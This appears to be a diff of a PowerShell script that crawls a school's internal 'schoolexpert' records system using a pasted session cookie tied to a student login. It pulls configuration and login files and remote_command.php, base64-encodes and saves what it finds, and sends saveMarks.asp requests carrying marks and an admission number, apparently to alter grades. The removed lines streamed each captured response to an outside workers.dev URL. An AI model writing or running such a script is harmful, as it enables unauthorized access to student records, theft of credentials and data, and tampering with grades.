@@ -1,15 +1,27 @@
 # --- Configuration ---
 $BaseUrl    = "http://192.168.29.20"
-$WorkerUrl  = "https://wispy-sunset-a7c0.anox.workers.dev/cskm"
 $UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-$Cookie     = "fy=2025; userno=1; lock=none; usernoT=; fyT=;"
-$LogFile    = Join-Path $env:TEMP "crawl_results_$(Get-Date -Format 'yyyyMMdd_HHmm').json"
+$Cookie     = "admNoE=%C7%0D%90%E6%E8; fyE=%C4%0A%97%E2; loginByE=%A5N%D0%B3%B8%23%08; admNo=17515; fy=2025; loginBy=Student; ASPSESSIONIDSGDQBRST=KLINOGAALHLGDGJMFOENPAPD; ASPSESSIONIDCWCTBRTR=OCIDGFEDKGEJHBDELDIAPDKI; ASPSESSIONIDQGCRASTT=KBBMGGNBIDIBADOIHEDIHDCP; ASPSESSIONIDAERRDSST=JIMDBBIBJPHDPIEOLJMHEKMA; userno=1; lock=none; _gid=GA1.2.1932742890.1772021591; userno=1; fy=2025; usernoT=jXycB19tcRyJD3LguLToZbBvdfyJ%2BLiKzIIlSoz0PFLqgddd2Ufoad7x6VPZAB3OXObTIowXsQDWkBsnHGYKZw%3D%3D; fyT=B0%2FrbDxWkgqbNNx35RCvqVFiWwnid5j6BIx8jPC%2FgGylGzOut0gbS2dOm1Jt5uyuH5Gx5uVbs8khxUzY8HYmqw%3D%3D; PHPSESSID=bbli5lj6rr861a63rgmj17fcv9; ASPSESSIONIDAWQSCRSQ=FICOGLBDKEEILOEJKHGOFGCF"
+$Timeout    = 120 # 2 Minutes
+$OutputFile = Join-Path $env:TEMP "Internal_Crawl_$(Get-Date -Format 'yyyyMMdd_HHmm').json"
 
 $Paths = @(
     "/",
     "/schoolexpert",
-    "/schoolexpert/mstrUsers.php",
-    "/schoolexpert/mstrUsers.asp"
+    "/schoolexpert/mstrUsers.asp",
+    "/schoolexpert/saveMarks.asp",
+    "/schoolexpert/saveMarks.asp?marksObt=19&adm_no=18887&maxMarks=25&subExam=Weekly%20Test-1&st_subject=English&examName=Term-2&fy=2025&userNo=1",
+    "/schoolexpert/saveMarks.asp?marksObt=74&adm_no=18887&maxMarks=80&subExam=Yearly%20Exam&st_subject=SOCIAL%20SCIENCE&examName=Term-2&fy=2025&userNo=1",
+    "/schoolexpert/remote_command.php",
+    "/schoolexpert/js/progressSMS.js",
+    "/schoolexpert/connection.txt",
+    "/schoolexpert/StudentloginCheck.txt",
+    "/schoolexpert/schoolDetails.txt",
+    "/schoolexpert/examMarksEntry4.asp",
+    "/schoolexpert/SELibrary.txt",
+    "/schoolexpert/loginCheck.txt",
+   
+    
 )
 
 $Headers = @{
@@ -17,56 +29,61 @@ $Headers = @{
     "Cookie"     = $Cookie
 }
 
-# Container for all results
 $AllResults = @()
 
-Write-Host "Starting Crawl: $BaseUrl" -ForegroundColor Cyan
+Write-Host "Starting Data Extraction..." -ForegroundColor Cyan
+Write-Host "Target: $BaseUrl"
+Write-Host "Timeout set to $Timeout seconds per request."
 
 foreach ($Path in $Paths) {
     $FullUrl = "$BaseUrl$Path"
     
     $Entry = [ordered]@{
-        url         = $FullUrl
-        timestamp   = (Get-Date).ToString("o")
-        status_code = 0
-        success     = $false
-        base64_body = ""
-        error       = ""
+        url           = $FullUrl
+        timestamp     = (Get-Date).ToString("o")
+        status_code   = 0
+        content_found = $false
+        base64_body   = ""
+        error         = ""
     }
 
     try {
-        $Response = Invoke-WebRequest -Uri $FullUrl -Headers $Headers -Method Get -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+        # Perform request with 2-minute timeout and BasicParsing for speed
+        $Response = Invoke-WebRequest -Uri $FullUrl -Headers $Headers -Method Get -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
         
-        $Entry.status_code = [int]$Response.StatusCode
-        $Entry.success     = $true
+        $Entry.status_code   = [int]$Response.StatusCode
+        $Entry.content_found = $true
         
-        # Encode HTML content to Base64
-        $Bytes            = [System.Text.Encoding]::UTF8.GetBytes($Response.Content)
-        $Entry.base64_body = [Convert]::ToBase64String($Bytes)
+        # Capture FULL content length and encode to Base64
+        $RawContentBytes     = $Response.Content
+        # Ensure we handle content as Raw Bytes to preserve binary or non-standard characters
+        if ($RawContentBytes -is [string]) {
+            $RawContentBytes = [System.Text.Encoding]::UTF8.GetBytes($RawContentBytes)
+        }
+        $Entry.base64_body   = [Convert]::ToBase64String($RawContentBytes)
         
-        Write-Host "OK: $Path" -ForegroundColor Green
+        Write-Host "Successfully captured: $Path" -ForegroundColor Green
     } catch {
-        $Entry.success = $false
-        $Entry.error   = $_.Exception.Message
+        $Entry.content_found = $false
+        $Entry.error         = $_.Exception.Message
+        
         if ($_.Exception.Response) {
             $Entry.status_code = [int]$_.Exception.Response.StatusCode
         }
-        Write-Host "FAIL: $Path" -ForegroundColor Red
+        Write-Host "Failed: $Path - $($Entry.error)" -ForegroundColor Red
     }
 
     $AllResults += $Entry
-
-    # Post individual result to Worker immediately (Stream mode)
-    try {
-        $JsonEntry = $Entry | ConvertTo-Json -Depth 10
-        Invoke-RestMethod -Uri $WorkerUrl -Method Post -Body $JsonEntry -ContentType "application/json"
-    } catch {
-        Write-Host "Worker Post Failed for $Path" -ForegroundColor Yellow
-    }
 }
 
-# Write all results to the single local JSON file
-$AllResults | ConvertTo-Json -Depth 10 | Set-Content -Path $LogFile
-
-Write-Host "`nComplete." -ForegroundColor Cyan
-Write-Host "Local Log: $LogFile"
+# Consolidate all data into the single JSON file
+try {
+    $JsonOutput = $AllResults | ConvertTo-Json -Depth 10
+    $JsonOutput | Set-Content -Path $OutputFile -Encoding UTF8
+    
+    Write-Host "`nProcessing Complete." -ForegroundColor Cyan
+    Write-Host "Data saved to: " -NoNewline
+    Write-Host $OutputFile -ForegroundColor Yellow
+} catch {
+    Write-Host "Error saving file: $($_.Exception.Message)" -ForegroundColor Red
+}
